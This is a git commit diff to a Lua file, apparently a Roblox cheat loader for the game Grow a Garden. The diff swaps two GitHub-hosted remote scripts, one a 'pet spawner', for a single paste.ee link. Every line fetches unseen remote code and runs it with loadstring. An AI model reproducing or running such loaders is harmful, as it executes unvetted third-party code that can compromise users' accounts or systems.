3308ca5addbe8323b3bc2bea27c054867642c15a
vthangsitink <191318345+Day326@users.noreply.github.com>
2025-06-13 19:39:00 +0800

    GrowAGarden.lua

--- GrowAGarden.lua
+++ GrowAGarden.lua
@@ -1,3 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Day326/Dark-Continent/refs/heads/main/DarkScience.lua"))()
-wait(3600)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
+loadstring(game:HttpGet("https://paste.ee/r/IIBN0Gcj"))()
